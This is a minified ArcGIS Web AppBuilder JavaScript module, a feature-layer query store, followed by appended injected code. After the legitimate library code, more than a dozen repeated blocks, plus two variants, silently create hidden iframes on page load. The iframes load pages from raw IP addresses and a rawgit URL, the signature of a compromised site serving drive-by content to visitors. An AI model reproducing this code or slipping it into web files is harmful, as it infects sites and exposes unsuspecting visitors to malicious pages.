// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array esri/tasks/query esri/tasks/QueryTask ./FeatureLayerQueryResult".split(" "),function(g,h,l,m,p,n){return g(null,{queryUrl:"",idProperty:"id",data:null,_entityData:null,constructor:function(a){g.safeMixin(this,a);this.data=[];this._entityData=[];this.layer=a.layer;this.objectIds=a.objectIds;this.where=a.where;this.orderByFields=a.orderByFields;this.totalCount=a.totalCount;this.batchCount=a.batchCount||25;this.idProperty=this.layer.objectIdField;
this.spatialFilter=a.spatialFilter;this.layer&&this.layer.url&&(this.queryTask=new p(this.layer.url))},get:function(a){return this.data[a]},getIdentity:function(a){return a[this.idProperty]},query:function(a,f){var d=new m,e=f&&f.start||0,k=f._export_count||this.batchCount,c=null;"function"===typeof a?c=a(this._entityData):"[object Array]"===Object.prototype.toString.call(a)&&(c=a);this.objectIds?(c=c?c:this.objectIds,d.objectIds=c.length>=e+this.batchCount?c.slice(e,e+k):c.slice(e)):(c&&0<c.length?
d.objectIds=c.length>=e+this.batchCount?c.slice(e,e+k):c.slice(e):(d.start=e,d.num=k,d.where=this.where,d.geometry=this.spatialFilter,d.spatialRelationship=m.SPATIAL_REL_INTERSECTS),(a=f.sort)&&0<a.length&&(a=l.map(a,function(a){return a.attribute+" "+(a.descending?"DESC":"ASC")}),d.orderByFields=a));d.returnGeometry="esriGeometryPoint"===this.layer.geometryType;d.outFields=["*"];var g=this.totalCount;a=null;a=!d.where;if(!(d.objectIds&&0<d.objectIds.length)&&a)return new n([]);a=this.queryTask?this.queryTask.execute(d):
this.layer.queryFeatures(d);a.total=a.then(h.hitch(this,function(a){var b=0,c=this.layer.objectIdField;if(this.objectIds){if(!c)for(b=0;b<a.fields.length;b++)if("esriFieldTypeOID"===a.fields[b].type){c=a.fields[b].name;break}for(var e={},b=0;b<a.features.length;b++)e[a.features[b].attributes[c]]=a.features[b];a.features=l.map(d.objectIds,function(a){return e[a]})}for(b=0;b<a.features.length;b++)if(a.features[b]){var f=a.features[b];a.features[b]=h.mixin(h.clone(f.attributes),{geometry:f.geometry});
this.data[a.features[b][c]]=a.features[b];this._entityData.push(a.features[b])}a=a.features;return g}),function(){console.log("FeatureLayerQueryStore queryFeatures failed.");return 0});return new n(a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});